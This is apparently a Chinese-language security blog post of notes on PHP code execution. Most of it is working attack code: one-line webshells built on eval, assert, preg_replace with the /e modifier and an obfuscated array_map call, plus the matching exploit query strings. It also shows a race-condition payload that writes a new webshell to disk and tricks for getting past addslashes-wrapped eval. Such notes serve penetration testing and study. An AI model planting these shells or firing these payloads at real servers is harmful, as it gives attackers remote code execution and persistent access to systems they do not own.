---
title: php代码执行与命令执行
date: 2019-01-06 20:35:09
tags: [php]
categories:
  - [php]
  - [整理]
---

# php代码执行与命令执行

## 代码执行

### eval()  

— 把字符串作为PHP代码执行

```php
#例:一句话木马
<?php
@eval($_GET["cmd"]);
?>
```

利用方式：

```php
1. shell.php?cmd=phpinfo();

#文件上传条件竞争可利用此方式来创建文件
2. shell.php?cmd=fputs(fopen('test.php','w'),'<?php @eval($_POST[test])?>')

#绕过
<?php
$cmd = @(string)$_GET["cmd"];
eval('$cmd="' . addslashes($cmd) . '";');
?>
3. shell.php?cmd=${${phpinfo()}};

#绕过
<?php
$cmd = "echo \"hello " . $_GET['cmd'] . "\";";
eval($cmd);?>
4. ${${}}
shell.php?cmd=${${phpinfo()}};
```



### assert()

— bool assert ( [mixed](http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$assertion` [, Throwable `$exception` ] )

如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。

```php
#例:一句话木马
<?php
@assert($_GET["cmd"]);
?>
```

### preg_replace + '/e'

preg_replace — 执行一个正则表达式的搜索和替换

preg_replace ( $pattern , $replacement , $subject )

preg_replace(1,2,3),在3中用1的格式匹配，用2的格式输出。

代码执行条件：

1. magic_quotes_gpc=Off时，导致代码执行。

2. pattern参数中注入/e选项

```php
<?php
$regexp = $_GET['reg'];
$var = '<php>phpinfo()</php>';
preg_replace("/<php>(.*?)$regexp", '\\1', $var);
?>
#利用方式 reg=%3C\/php%3E/e 即reg=<\/php>/e
```

利用方式：

```php
#当replacement 参数构成一个合理的php 代码字符串的时候
#/e 修正符使preg_replace()，将replacement 参数当做php 代码执行
#例:一句话木马
1.
<?php
preg_replace("//e", $_GET['cmd'], "cmd test");
?>
shell.php?cmd=phpinfo();

2.
<?
preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
?>
h=[php]phpinfo()[/php]
```
![001](/img/php/php_fun_CodeAndOrder/001.png)

### array_map

```php
#例:一句话木马
<?php array_map("ass\x65rt",(array)$_REQUEST['test']);?>
1.shell.php?test=phpinfo()
```

